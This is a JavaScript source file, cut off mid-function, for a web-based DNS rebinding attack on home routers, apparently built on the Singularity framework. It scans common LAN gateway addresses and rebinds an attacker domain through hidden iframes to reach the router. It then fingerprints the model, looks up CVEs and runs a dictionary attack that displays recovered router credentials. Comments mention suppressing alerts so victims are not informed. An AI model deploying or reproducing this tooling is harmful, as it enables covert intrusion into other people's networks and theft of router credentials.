var session = 0;
var intervalId = null; 
var browserBlockAttack = false;
var printLog = document.getElementById('consolelog');

const ScanManager = () => {

    // check
    function portsList(ports) {
        const portsExp = ports.split(",");
        let portsArr = [];
        for (s of portsExp) {
            if (s.includes("-")) {
                const r = s.split("-")
                const r0 = parseInt(r[0], 10);
                const r1 = parseInt(r[1], 10) + 1;
                for (let i = r0; i < r1; i++) {
                    portsArr.push(i);
                }
            } else {
                portsArr.push(s);

            }
        }
        return portsArr;
    };

    //https://stackoverflow.com/questions/12303989/cartesian-product-of-multiple-arrays-in-javascript
    const f = (a, b) => [].concat(...a.map(d => b.map(e => [].concat(d, e))));
    const cartesian = (a, b, ...c) => (b ? cartesian(f(a, b), ...c) : a);

    // check
    function ipAddressList(ipAddressSpec) {
        const targetExp = ipAddressSpec.split(",");
        let final = [];

        for (s of targetExp) {
            // Do we have a cname
            // TKTK implement better check.
            if (s.match(/[a-z]/i)) {
                final.push(s);
                continue;
            };

            const arr = s.split(".")
            let j = 0
            let temp = [
                [],
                [],
                [],
                []
            ];
            for (a of arr) {
                if (a.includes("-")) {
                    const r = a.split("-")
                    const r0 = parseInt(r[0], 10);
                    const r1 = parseInt(r[1], 10) + 1;
                    for (let i = r0; i < r1; i++) {
                        temp[j].push(i);
                    }

                } else {
                    temp[j].push(a);

                }
                j += 1;
            }
            let final_temp = cartesian(temp[0], temp[1], temp[2], temp[3])
            for (s of final_temp) {
                final.push(s.join("."))
            }
        }
        return final;
    }
    let workerList = [];
    let results = [];
    let index = 0;
    let workerCount = window.navigator.hardwareConcurrency || 4;
    let messageReceived = 0;
    let targetTimeoutErrors = {};
    let doneRescan = false;
    let timeOut = 300;

    return {
        // check
        run(ipAddressSpec, portSpec, resultFn, completedFn) {
            let addresses = ipAddressList(ipAddressSpec);
            let portsArr = portsList(portSpec);
            let targets = cartesian(addresses, portsArr);

            for (let i = 0; i < workerCount; i++) {
                let worker = new Worker('scan.js');
                workerList.push(worker);
            }

	    // check
            function checkScanDone(lastResult) {
                if (lastResult != null) {
                    resultFn(lastResult);
                };

                if (index === targets.length && messageReceived === targets.length) {
                    const targetSizeBeforeChange = targets.length;

                    if (doneRescan === false) {
                        doneRescan = true;
                        timeOut = 3000;

                        for (let target in targetTimeoutErrors) {
                            // if not all scanned ports for a given host timed out 
                            // (e.g. fetch error instead), then we should rescan.
                            // Works if we scan two ports per host (one closed and one open)
                            if (targetTimeoutErrors[target].count < portsArr.length) {
                                targetTimeoutErrors[target].rescanports.forEach(port => {
                                    targets.push([target, port]);
                                })
                            };
                        };

                        if (targetSizeBeforeChange === targets.length) {
                            results.sort(function (a, b) {
                                return (b.duration - a.duration);
                            });
                            completedFn(results);
                            return true;

                        } else {
                            console.log(`Rescanning targets with larger timeout: ${targets.slice(index)}`);
                            printLog.innerHTML += `Rescanning targets with larger timeout: ${targets.slice(index)}` + "<br />";
                            return false;

                        }
                    } else {
                        results.sort(function (a, b) {
                            return (b.duration - a.duration);
                        });
                        completedFn(results);
                        return true;
                    }
                } else {
                    return false;

                }
            }

            for (let w of workerList) {
                w.onmessage = function (msg) {
                    let lastResult = null;
                    if (msg.data.error === false) {
                        results.push(msg.data);
                        lastResult = msg.data;
                    } else if (msg.data.errorReason === 'timeout') {
                        if (msg.data.target.address in targetTimeoutErrors) {
                            targetTimeoutErrors[msg.data.target.address].count += 1;
                            targetTimeoutErrors[msg.data.target.address]
                                .rescanports.push(msg.data.target.port);
                        } else {
                            targetTimeoutErrors[msg.data.target.address] = {
                                count: 1,
                                rescanports: [msg.data.target.port]
                            };
                        };
                    } else if (msg.data.errorReason === 'Failed to fetch') {
                    	browserBlockAttack = true;
                    };

                    messageReceived++;

                    if (checkScanDone(lastResult) === false) {

                        if (index < targets.length) {
                            let target = {
                                "address": targets[index][0],
                                "port": targets[index][1]
                            };
                            w.postMessage({ targetdata: target, timeout: timeOut });
                            index++;
                        }
                    }
                }
            }

            for (let w of workerList) {
                if (index < targets.length) {
                    let target = {
                        "address": targets[index][0],
                        "port": targets[index][1]
                    };
                    w.postMessage({ targetdata: target, timeout: timeOut });
                    index++;
                } else {
                    break;
                }
            }
        },
        shutDown() {
            for (let w of workerList) {
                w.terminate();
            }
        }
    }
}

// check
function resultFn(result) {	
    printLog.innerHTML += "Router IP found successfully: " + result.target.address + "<br />";
    document.getElementById('targethostipaddress').value = result.target.address;
}

// check
function doneFn(results) {
    setTimeout(function () {
	sm.shutDown();
    }, 3000);
    if (results.length === 0 && browserBlockAttack == false) {
    	printLog.innerHTML += "No router found <br />";
    	let element = document.getElementById('labelerrortargethostipaddress');
    	element.classList.remove("visually-hidden");
    	element.innerText = "No router found, please enter the IP address manually.";
    	element.setAttribute('style', "color: red");
    } 
    if (browserBlockAttack == true) {
    	retriveInfoRouter("browser");	
    }

}

const ipTarget = "192.168.0.1,192.168.1.1,192.168.2.1,192.168.3.1,192.168.5.1,192.168.8.1,192.168.10.1";
const portTarget = "80";

function scan() {
    let element = document.getElementById('labelerrortargethostipaddress');
    element.innerHTML = '';
    element = document.getElementById('details');
    element.classList.remove("visually-hidden");
    sm = ScanManager();
    const addrSpec = ipTarget;
    const portSpec = portTarget;
    sm.run(addrSpec, portSpec, resultFn, doneFn);
}


function hide() {
    let element = document.getElementById('showdetails');
    element.classList.remove("visually-hidden");
    element = document.getElementById('hidedetails');
    element.classList.add("visually-hidden");
    element = document.getElementById('consolelog');
    element.classList.add("visually-hidden");
}

function show() {
    let element = document.getElementById('showdetails');
    element.classList.add("visually-hidden");
    element = document.getElementById('hidedetails');
    element.classList.remove("visually-hidden");
    element = document.getElementById('consolelog');
    element.classList.remove("visually-hidden");
}

function rebindingFailed() {
    let element = document.getElementById('attackfail');
    element.classList.remove("visually-hidden");
}

/* Attack Management */

const Payload = () => {
    let name = null;
    let ports = [];
    return {
        getName() {
            return name;
        },
        getPorts() {
            return ports;
        },
        init(n, p) {
            name = n;
            ports = p;
        }
    }
}

const Configuration = () => {
    let type = null; // determine whether we run a manager driven or automated attack
    let automatic = null;
    let delayDOMLoad = null;
    let alertSuccess = null;
    let hideActivity = null;

    let attackPayloads = [];
    let attackHostDomain = null;
    let attackHostIPAddress = null;
    let targetHostIPAddress = null;
    let dummyPort = null;
    let indexToken = null;
    let attackPayload = null;
    let interval = null;
    let rebindingStrategy = null;
    let flushDns = null;

    let rebindingSuccessFn = null;

    // Obtains URL query parameters value based on name
    // Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
    //as URLSearchParams API not supported by all browsers
    // Returns `null` if  URL parameter `name` is not present, other its value.
    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        let regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    return {
        init(rebindingSuccessCb) {
            // Set URL parameter `startattack` to some value 
            // to automatically start attack upon loading manager.html page
            automatic = getParameterByName('startattack');
            // Set URL parameter `delaydomload` to some value 
            // to delay the browser DOM load event
            // and prevent premature exit of headless browsers
            delayDOMLoad = getParameterByName('delaydomload');
            // Set URL parameter `alertsuccess` to "false"
            // to not present an alert box upon a successful rebinding attack.
            // This may be useful for:
            // * not informing a victim that an attack completed
            // * or to freeze a headless browser forever (unless performing a DoS attack).
            alertSuccess = getParameterByName('alertsuccess');
            type = (window.location.pathname === '/manager.html') ? 'manager' : 'automatic';
            rebindingSuccessFn = rebindingSuccessCb;
        },
        getType() {
            return type;
        },
        getDelayDOMLoad() {
            return delayDOMLoad;
        },
        getAutomatic() {
            return automatic;
        },
        getAlertSuccess() {
            return alertSuccess;
        },
        getHideActivity() {
            return hideActivity;
        },
        // Fetches manager-config.json and update Configuration object
        getManagerConfiguration() {
            let result = fetch('/resources/manager-config.json')
                .then(function (r) {
                    return r.text()
                })
                .then(function (d) {
                    let config = JSON.parse(d);
                    for (let p of config.attackPayloads) {
                        let myConfigPayload = Payload();
                        myConfigPayload.init(p.name, p.ports);
                        attackPayloads.push(myConfigPayload);
                    }
                    attackHostDomain = config.attackHostDomain;
                    attackHostIPAddress = config.attackHostIPAddress;
                    targetHostIPAddress = config.targetHostIPAddress;
                    dummyPort = config.dummyPort;
                    indexToken = config.indexToken;
                    interval = config.interval;
                    wsProxyPort = config.wsProxyPort;
                    rebindingStrategy = config.rebindingStrategy;
                    flushDns = config.flushDns;
                })
            return result;
        },
        getAttackPayloads() {
            return attackPayloads;
        },
        getAttackHostDomain() {
            return attackHostDomain;
        },
        getAttackHostIPAddress() {
            return attackHostIPAddress;
        },
        getTargetHostIPAddress() {
            return targetHostIPAddress;
        },
        getTargetPort() {
            return targetPort;
        },
        getDummyPort() {
            return dummyPort;
        },
        getIndexToken() {
            return indexToken;
        },
        getAttackPayload() {
            return attackPayload;
        },
        setAttackPayload(attackPayloadName) {
            attackPayload = attackPayloadName;
        },
        getInterval() {
            return interval;
        },
        setInterval(i) {
            interval = i;
        },
        getWsProxyPort() {
            return wsProxyPort;
        },
        setWsProxyPort(port) {
            wsProxyPort = port;
        },
        getRebindingStrategy() {
            return rebindingStrategy;
        },
        getFlushDns() {
            return flushDns;
        },
        setFlushDns(boolean) {
            flushDns = boolean;
        },
        getRebindingSuccessFn() {
            return rebindingSuccessFn
        },
        setManually(configObject) {
            attackHostIPAddress = configObject.attackHostIPAddress;
            attackHostDomain = configObject.attackHostDomain;
            rebindingStrategy = configObject.rebindingStrategy;
            flushDns = configObject.flushDns;
            interval = configObject.interval;
            wsProxyPort = configObject.wsProxyPort;
            indexToken = configObject.indexToken;
            attackPayload = configObject.attackPayload;
            hideActivity = configObject.hideActivity;
            delayDOMLoad = configObject.delayDOMLoad;
            rebindingSuccessFn = configObject.rebindingSuccessFn;

            if ((type === 'automatic') &&
                (hideActivity === false)) {
                body.style.display = 'block'
            }
            if (delayDOMLoad === null) {
                delaydomloadframe.parentNode.removeChild(delaydomloadframe);
            }
        }
    }
}

const Frame = (id, url) => {
    let fmid = id;
    let fmurl = url;
    let timer = null;
    let errorCount = 0;
    let interval = null;
    return {
        getId() {
            return fmid;
        },
        setURL(val) {
            return url = val;
        },
        getURL() {
            return fmurl;
        },
        getTimer() {
            return timer;
        },
        setTimer(val) {
            return timer = val;
        },
        getInterval() {
            return interval;
        },
        setInterval(val) {
            interval = val;
        },
        getErrorCount() {
            return errorCount;
        },
        incrementErrorCount() {
            return errorCount += 1;
        }
    }
};

const FrameManager = () => {
    let nextFrameIdVal = 0;
    let frames = new Map();
    let origins = new Map();
    const nextFrameId = () => {
        return nextFrameIdVal++;
    };
    const origin = (url) => {
        //Does not work in IE11. 
        //const u = new URL(url); 
        // Workaround:
        let u = document.createElement('a');
        let id = Math.random().toString();
        u.setAttribute('href', url);
        u.setAttribute('id', id);
        const o = u.port ? `${u.protocol}//${u.hostname}:${u.port}` : `${u.protocol}//${u.hostname}`;
        u.remove();
        return o;
    };
    return {
        addFrame(url) {
            const frameId = `frame-${nextFrameId().toString()}`;
            frames.set(frameId, Frame(frameId, url));
            origins.set(origin(url), frameId);
            return frameId;
        },
        removeFrame(frameId) {
            const url = frames.get(frameId).getURL();
            origins.delete(origin(url));
            return frames.delete(frameId);
        },
        updateFrame(frameId, url) {
            const oldurl = frames.get(frameId).getURL();
            const neworign = orign(url)
            origins.delete(origin(oldurl));
            origins.set(neworigin, frameId);
            frames.set(frameId, Frame(frameId, url));
        },
        frames() {
            return frames;
        },
        lastFrameId() {
            return nextFrameIdVal === 0 ? null : `frame-${nextFrameIdVal - 1}`;
        },
        frame(id) {
            return frames.get(id);
        },
        getFrameOrigin(origin) {
            return origins.get(origin);
        }
    }
};

// Toggles display of advanced settings.
function toggle() {
    if (advanced.className === 'd-block') {
        advanced.className = 'd-none'
    } else {
        advanced.className = 'd-block'
    }
}

// Requests Singularity to instantiate a new HTTP server on specified port.
function requestPort() {
    putData('/servers', {
        "Port": document.getElementById('targetport').value
    })
        .then(function (data) {
            getHTTPServersConfig().then(function (HTTPServersConfig) {
                document.getElementById('listenports').textContent = HTTPServersConfig.ports;
                document.getElementById('targetport').value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
            })
        })
        .catch(error => console.error(error))
}

// Requests Singularity to provide list of HTTP servers/ports.
function getHTTPServersConfig() {
    let ports = [];
    return fetch('/servers')
        .then(function (response) {
            return response.json();
        })
        .then(function (myJsonConfig) {

            for (let e of myJsonConfig.ServerInformation) {
                ports.push(e.Port);
            }
            promise = new Promise((resolve, reject) => {
                resolve({
                    ports: ports,
                    AllowDynamicHTTPServers: myJsonConfig.AllowDynamicHTTPServers
                });
            })
            return promise;
        })
}

function putData(url, data) {
    // Default options are marked with *
    return fetch(url, {
        body: JSON.stringify(data),
        method: 'PUT',
    })
        .then(response => response.json())
}

const App = () => {
    let configuration = null;
    let fm = null;
    let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";

    // Push settings from configuration object (obtained from manager-config.json) to UI.
    function populateManagerConfig() {
        payloadsElement = document.getElementById('payloads');
        for (let p of configuration.getAttackPayloads()) {
            let option = document.createElement('option');
            option.value = p.getName();
            let port = '';
            if (p.getPorts().length > 0) {
                port = ' (default port ' + p.getPorts() + ')';
            }
            option.text = p.getName() + port;
            payloadsElement.add(option, 0);
        }
        document.getElementById('attackhostdomain').value = configuration.getAttackHostDomain();
        document.getElementById('attackhostipaddress').value = configuration.getAttackHostIPAddress();
        //document.getElementById('targethostipaddress').value = configuration.getTargetHostIPAddress();
        document.getElementById('dummyport').value = configuration.getDummyPort();
        document.getElementById('indextoken').value = configuration.getIndexToken();
        document.getElementById('interval').value = configuration.getInterval();
        document.getElementById('wsproxyport').value = configuration.getWsProxyPort();
        document.getElementById(configuration.getRebindingStrategy()).selected = true;
        document.getElementById('flushdns').checked = configuration.getFlushDns();
    };

    function generateAttackUrl(targetHostIPAddress, targetPort, forceDnsRebindingStrategyName) {
        return hosturl
            .replace("%1", configuration.getAttackHostIPAddress())
            .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
            .replace("%3", Math.floor(Math.random() * 2 ** 32))
            .replace("%4", forceDnsRebindingStrategyName === null ?
                configuration.getRebindingStrategy() : forceDnsRebindingStrategyName)
            .replace("%5", configuration.getAttackHostDomain())
            .replace("%6", targetPort)
            .replace("%7", 'soopayload.html' + '?rnd=' + Math.random())
    };

    return {
        getFrameManager() {
            return fm;
        },
        getConfiguration() {
            return configuration;
        },

        attackTarget(targetHostIPAddress, targetPort, optimizeForSpeed) {
            let self = this;

            let payload = app.getConfiguration().getRebindingStrategy();
            let interval = self.getConfiguration().getInterval();

            if (optimizeForSpeed === true) {
                // let's try some rebinding strategy optimizations 
                // Rebinding in 3s!
                if (targetHostIPAddress === '0.0.0.0' && isUnixy() === true) {
                    payload = 'ma';
                    interval = '1';

                } else if (targetHostIPAddress === '127.0.0.1' && isUnixy() === false) {
                    payload = 'ma';
                    interval = '1';
                }
            }

            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload));
            self.getFrameManager().frame(fid).setInterval(interval);

            self.addFrameToDOM(self.getFrameManager().frame(fid));
            self.getFrameManager().frame(fid).setTimer(setInterval((() => {
                self.reloadAttackFrame(self.getFrameManager().frame(fid))
            }), parseInt(interval) * 1000));

        },
        init(rebindingSuccessCb) {
            let self = this;

            fm = FrameManager();

            // Configuration
            configuration = Configuration();
            // Initialize defaults settings and settings passed from URL query.
            configuration.init(rebindingSuccessCb);

            // Message handler between Manager and attack frames
            window.addEventListener('message', self.receiveMessage, false);

            if (configuration.getType() === 'manager') {

                // Singularity HTTP server settings initialization
                document.addEventListener('DOMContentLoaded', function (event) {
                    let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
                        document.getElementById('listenports').textContent = HTTPServersConfig.ports;
                        document.getElementById('targetport').value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
                        document.getElementById('requestport').disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
                    });

                    // Fetch Manager configuration from Singularity HTTP server
                    let payloadsAndTargets = configuration.getManagerConfiguration();

                    // Once we have our HTTP servers config, payloads and targets
                    Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
                        populateManagerConfig();
                        //start attack on page load if ?startattack is set     
                        if (configuration.getAutomatic() !== null) {
                            self.begin();
                        }
                    });
                });
            };
        },
        addFrameToDOM(frame) {
            let f = document.createElement('iframe');
            f.src = frame.getURL();
            f.setAttribute('id', frame.getId());
            f.setAttribute('style', "display: none");
            document.getElementById('attackframes').appendChild(f);
        },

        // Set src of attackframe
        // thus loading the attack payload before rebinding
        // and accessing the target after rebinding.
        reloadAttackFrame(frame) {
            document.getElementById(frame.getId()).src = frame.getURL();
        },

        // communication handler between manager and attack iframe.
        receiveMessage(msg) {
            console.log('Message received from: ', msg.origin, msg.data.status);
            printLog.innerHTML += 'Message received from: ' + msg.origin + " " + msg.data.status + "<br />";
     	   
            const fid = fm.getFrameOrigin(msg.origin)
            // If we don't have a frame ID for this message origin, dismiss message.
            if (fid === undefined) {
                return;
            };

            if (msg.data.status === 'start') {
                console.log(`Iframe reports that attack has started: ${msg.origin}`);
                printLog.innerHTML += `Iframe reports that attack has started: ${msg.origin}` + "<br />";
                clearInterval(fm.frame(fid).getTimer());
                msg.source.postMessage({
                    cmd: 'payload',
                    param: configuration.getAttackPayload()
                }, "*");
                msg.source.postMessage({
                    cmd: 'interval',
                    param: fm.frame(fid).getInterval() ? fm.frame(fid).getInterval() : configuration.getInterval()
                }, "*");
                msg.source.postMessage({
                    cmd: 'wsproxyport',
                    param: configuration.getWsProxyPort()
                }, "*");
                msg.source.postMessage({
                    cmd: 'indextoken',
                    param: configuration.getIndexToken()
                }, "*");
                msg.source.postMessage({
                    cmd: 'flushdns',
                    param: { hostname: window.location.hostname, flushDns: configuration.getFlushDns() }
                }, "*");
                configuration.setFlushDns(false); // so it run only once in autoattack.
                msg.source.postMessage({
                    cmd: 'start',
                    param: null
                }, "*");
            }
            if (msg.data.status === 'success') {
                configuration.getRebindingSuccessFn()(msg);
                msg.source.postMessage({
                    cmd: 'stop'
                }, "*");
            };

            if (msg.data.status === 'requiresHttpAuthentication') {
                document.getElementById(fid).contentWindow.postMessage({
                    cmd: 'stop'
                }, "*");
                console.log(`This resource requires HTTP authentication. Cannot access without user noticing: ${msg.origin}`);
                printLog.innerHTML += `This resource requires HTTP authentication. Cannot access without user noticing: ${msg.origin}` + "<br />";
            }

            // Possibly a firewalled or closed port. Possibly a non-HTTP service.
            if (msg.data.status === 'error' || msg.data.status === 'Failed to fetch') {
                fm.frame(fid).incrementErrorCount();
                console.log(`error: ${msg.origin}`);
                printLog.innerHTML += `error: ${msg.origin}` + "<br />";
                if (fm.frame(fid).getErrorCount() === 3) {
                    document.getElementById(fid).contentWindow.postMessage({
                        cmd: 'stop'
                    }, "*");
                    console.log(`Too many errors, stopping: ${msg.origin}`);
                    printLog.innerHTML += `Too many errors, stopping: ${msg.origin}` + "<br />";
                    if (msg.data.status === 'Failed to fetch') {
                       retriveInfoRouter("browser");

                    } else {
                    	retriveInfoRouter("router");  
            
                    }
                }
            }
        },
        // Starts attack
        begin() {
            let self = this;
            
            document.getElementById("startattack").disabled = true;
            var element = document.getElementById('labelerrortargethostipaddress');
            element.innerHTML = '';
            element = document.getElementById('labelerrorattackhostipaddress');
            element.innerHTML = '';            

            var ipaddress1 = document.getElementById('targethostipaddress').value;
            var ipaddress2 = document.getElementById('attackhostipaddress').value;
                        
            const UiAttackPayloadName = document.getElementById('payloads').value;
            configuration.setAttackPayload(UiAttackPayloadName);
            
            if(checkIfValidIP(ipaddress1) == false) {
            	element = document.getElementById('labelerrortargethostipaddress');
	    	element.innerText = "Please enter a valid IP address";
	    	element.setAttribute('style', "color: red");
	    	element.classList.remove("visually-hidden");
            }
            if(checkIfValidIP(ipaddress2) == false) {
            	element = document.getElementById('labelerrorattackhostipaddress');
	    	element.innerText = "Please enter a valid IP address";
	    	element.setAttribute('style', "color: red");
	    	element.classList.remove("visually-hidden");            
            } 
            if(checkIfValidIP(ipaddress1) && checkIfValidIP(ipaddress2)) {
		element = document.getElementById("rightcontainer");
		element.classList.add("d-flex");
		element.classList.add("aligns-items-center");
		element.classList.add("justify-content-center");
            	element = document.getElementById('loadingDNS');
            	element.classList.remove("visually-hidden");

            	self.startAttack();
	    }
        },
        
        startAttack() {
            let self = this;

            var element = document.getElementById('details');
            element.classList.remove("visually-hidden");

            const UiInterval = document.getElementById('interval').value;
            configuration.setInterval(UiInterval);

            const UiFlushDns = document.getElementById('flushdns').checked;
            configuration.setFlushDns(UiFlushDns);

            const UiAttackPayloadName = document.getElementById('payloads').value;
            configuration.setAttackPayload(UiAttackPayloadName);

            const UiAttackWsProxyPort = document.getElementById('wsproxyport').value;
            configuration.setWsProxyPort(UiAttackWsProxyPort);
            
            session = Math.floor(Math.random() * 2 ** 32);

            let fid = fm.addFrame(hosturl
                .replace("%1", document.getElementById('attackhostipaddress').value)
                .replace("%2", document.getElementById('targethostipaddress').value.replace(/-/g, '--'))
                .replace("%3", session)
                .replace("%4", document.getElementById('rebindingStrategy').value)
                .replace("%5", document.getElementById('attackhostdomain').value)
                .replace("%6", document.getElementById('targetport').value)
                //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
                .replace("%7", 'soopayload.html') + '?rnd=' + Math.random());
                
            self.addFrameToDOM(fm.frame(fid));

            fm.frame(fid).setTimer(setInterval((() => {
                self.reloadAttackFrame(fm.frame(fid))
            }), parseInt(UiInterval) * 1000));        
        }
    }
}

function isUnixy() {
    return !(navigator.platform.includes('Win'));
}

function rebindingSuccessCb(msg) {
    console.log(`Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`);
    printLog.innerHTML += `Iframe reports attack successful for ${msg.origin}\n${msg.data.response}` + "<br />";

    if (document.getElementById('payloads').value === 'Router Attack') {
    	retriveInfoRouter(msg.data.response);
    	drawRebindingSuccess();
    	statusAttack(true);
    }
    

}

/* Check if string is IP */
function checkIfValidIP(str) {
  // Regular expression to check if string is a IP address
  const regexExp = /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/gi;

  return regexExp.test(str);
}

function retriveInfoRouter(response) {
	let result = fetch('/resources/router-config.json')
                .then(function (r) {
                    return r.text()
                })
                .then(function (d) {
                    var routersList = JSON.parse(d);
                    console.log(routersList);
                    switch (response) {
			  case "browser":
			    drawRouterList(routersList.routers);
			    browserBlock();
			    break;
			  case "router":
			    drawRouterList(routersList.routers);
			    routerBlock();
			    break;
			  default:
			    	var found = false;
				     for (let r of routersList.routers) {
					     if (found === false && identifyRouter(response, r.identificationKeys)) {
					     	drawRouterInfo(r);
					     	found = true;
					     }
				     }
			       if(found === false) {
			           drawRouterList(routersList.routers);
			           failToFind();
			       }
	            }                    

                })
}

function identifyRouter(response, keysArray) {
	if (keysArray.length <= 0) {
		return false;
	}  
	for (let key of keysArray) {
		if(response.includes(key) === false) {
			return false;
		}
	}
	return true;
}

function drawRouterInfo(router) {
	
	document.getElementById('inputRouter').value = router.brand + " " + router.model;
	
	retriveVulnerability(router.brand, router.model, true);
	//retriveVulnerability("Huawei", "E303", true);
}

function drawRouterList(routersList) {
        let routersElement = document.getElementById('routerlist');
        for (let p of routersList) {
            let option = document.createElement('option');
            option.value = p.brand + " " + p.model;
            option.text = p.brand + " " + p.model;
            routersElement.add(option, 0);
        }

	var element = document.getElementById("rightcontainer");
	element.classList.remove("d-flex");
	element.classList.remove("aligns-items-center");
	element.classList.remove("justify-content-center");
	element = document.getElementById('loadingDNS');
	element.classList.add("visually-hidden");	
	element = document.getElementById('attackinfo');
	element.classList.remove("visually-hidden");
	element = document.getElementById('routernotfound');
	element.classList.remove("visually-hidden");
	element = document.getElementById('buttonvuln');
	element.classList.remove("visually-hidden");	
}

function failToFind() {
	let element = document.getElementById('labelred');
	element.classList.remove("visually-hidden");
}

function drawRebindingSuccess() {
	let element = document.getElementById('attacksuccessinfo');
	element.classList.remove("visually-hidden");
	element = document.getElementById('attackstatus');
	element.classList.remove("visually-hidden");
	element = document.getElementById('credentialsbutton');
	element.classList.remove("visually-hidden");	
}

function browserBlock() {	
	let element = document.getElementById("divtargethostipaddress");
	element.classList.add("visually-hidden");
	element = document.getElementById('buttonscan');
	element.classList.add("visually-hidden");
	element = document.getElementById('startattack');
	element.classList.add("visually-hidden");
	element = document.getElementById('attackfailedinfo');
	element.classList.remove("visually-hidden");
	element = document.getElementById('labelblack');
	element.classList.remove("visually-hidden");	
} 

function routerBlock() {
	let element = document.getElementById('attackfail');
	element.classList.remove("visually-hidden");
}

function statusAttack(condition) {
	if (condition == true) {
		intervalId = setInterval(checkStatus, 30000);
	} else {
		clearInterval(intervalId);
	}
	
}

function checkStatus() {

	let result = fetch('/checkstatus', {
		method: 'POST',
		body: JSON.stringify({SessionID: session.toString()})
	})
                .then(function (r) {
                    return r.text()
                })
                .then(function (d) {
		     console.log(d);
		     data = JSON.parse(d);
		     drawStatus(data);  
                })	
}

function drawStatus(data) {
	if(data.Status === "success") {
		console.log(data.Status)
		document.getElementById("successstatus").classList.remove("visually-hidden");
		document.getElementById("failstatus").classList.add("visually-hidden");
		document.getElementById("dictionaryAttackButton").disabled = false;
	} else {
		document.getElementById("successstatus").classList.add("visually-hidden");
		document.getElementById("failstatus").classList.remove("visually-hidden");
		document.getElementById("dictionaryAttackButton").disabled = true;
	} 
}

function dictionaryAttack() {

	let element = document.getElementById("vulncredentialsinfo");
	element.classList.add("d-flex");
	element.classList.add("aligns-items-center");
	element.classList.add("justify-content-center");
	element.classList.remove("visually-hidden");
    	element = document.getElementById('loadingattack');
    	element.classList.remove("visually-hidden");
    	element = document.getElementById('credentialsrouter');
	element.classList.add("visually-hidden");
	element = document.getElementById('credentialslabel1');
	element.classList.add("visually-hidden");
	element = document.getElementById('credentialslabel2');
	element.classList.add("visually-hidden");
	element = document.getElementById('credentialslabel3');
	element.classList.add("visually-hidden");	
  	    	    	
	routerInfo = document.getElementById('inputRouter').value.split(' ');
	var brand = routerInfo[0], model = routerInfo[1];
	
	let result = fetch('/dictionaryattack', {
		method: 'POST',
		body: JSON.stringify({SessionID: session.toString(), Brand: brand, Model: model})
	})
                .then(function (r) {
                    return r.text()
                })
                .then(function (d) {
		     console.log(d);
		     drawCredentials(d);
                })	
}

function drawCredentials(data) {
	var element = document.getElementById("vulncredentialsinfo");
	element.classList.remove("d-flex");
	element.classList.remove("aligns-items-center");
	element.classList.remove("justify-content-center");
	element = document.getElementById('loadingattack');
	element.classList.add("visually-hidden");
	element = document.getElementById('credentialsrouter');
	element.classList.remove("visually-hidden");
	
	data = JSON.parse(data);
	console.log(data);
	
	if(data.Username === "nil" && data.Password === "nil") {
		element = document.getElementById('credentialslabel2');
		element.classList.remove("visually-hidden");
		
		element = document.getElementById('credentials');
		element.classList.add("visually-hidden");
		
	} else if(data.Username === "null" && data.Password === "null") {
		element = document.getElementById('credentialslabel3');
		element.classList.remove("visually-hidden");
		
		element = document.getElementById('credentials');
		element.classList.add("visually-hidden");
		
	} else if (data.Username === "null") {
		element = document.getElementById('credentials');
		element.value = data.Password;
		element.classList.remove("visually-hidden");
		element = document.getElementById('credentialslabel1');
		element.classList.remove("visually-hidden");
				
	} else if (data.Password === "null") {
		element = document.getElementById('credentials');
		element.value = data.Username;
		element.classList.remove("visually-hidden");
		element = document.getElementById('credentialslabel1');
		element.classList.remove("visually-hidden");
				
	} else {
		element = document.getElementById('credentials');
		element.value = data.Username + " : " + data.Password;
		element.classList.remove("visually-hidden");
		element = document.getElementById('credentialslabel1');
		element.classList.remove("visually-hidden");			
	}
}

function checkVulnerability(param) {
	
	if(param == false) {
		let element = document.getElementById("loadingvuln");
		element.classList.remove("visually-hidden");	
		element = document.getElementById("buttonvuln");
		element.classList.add("visually-hidden");	
		
	}
    	
	routerInfo = document.getElementById('routerlist').value.split(' ');
	console.log(routerInfo)	
	retriveVulnerability(routerInfo[0], routerInfo[1]);
	//retriveVulnerability("Huawei", "E303", param);
}

function retriveVulnerability(brand, model, param) {
	let result = fetch('/routervuln', {
		method: 'POST',
		body: JSON.stringify({Brand: brand, Model: model})
	})
                .then(function (r) {
                    return r.text()
                })
                .then(function (d) {
		     data = JSON.parse(d);
		     console.log(data);
		     drawVulnerability(data, param);
                })
}

function drawVulnerability(data, param) {

	var element = document.getElementById("rightcontainer");
	element.classList.remove("d-flex");
	element.classList.remove("aligns-items-center");
	element.classList.remove("justify-content-center");
	element = document.getElementById('loadingDNS');
	element.classList.add("visually-hidden");
	element = document.getElementById('attackinfo');
	element.classList.remove("visually-hidden");
	if (param == true) {
		element = document.getElementById('attacksuccessinfo');
		element.classList.remove("visually-hidden");
		element = document.getElementById('attackstatus');
		element.classList.remove("visually-hidden");
		element = document.getElementById('routerfound');
		element.classList.remove("visually-hidden");
		element = document.getElementById('credentialsbutton');
		element.classList.remove("visually-hidden");	
	} else {  
		//element = document.getElementById('attackfailedinfo');
		//element.classList.remove("visually-hidden");
		element = document.getElementById('loadingvuln');
		element.classList.add("visually-hidden");			
	}

	element = document.getElementById('vulntable');
	element.classList.remove("visually-hidden");	
	
	if (data.CVE === null) {
		element = document.getElementById("infovulntableCVE");
		element.innerHTML = "There is no CVE related to your router, from ";	
				
		var link = document.createElement("a");
		link.setAttribute("href", "https://cve.mitre.org");
		link.setAttribute("target", "_blank");
		link.setAttribute("rel", "noopener noreferrer");
		
		var linkText = document.createTextNode("cve.mitre.org");
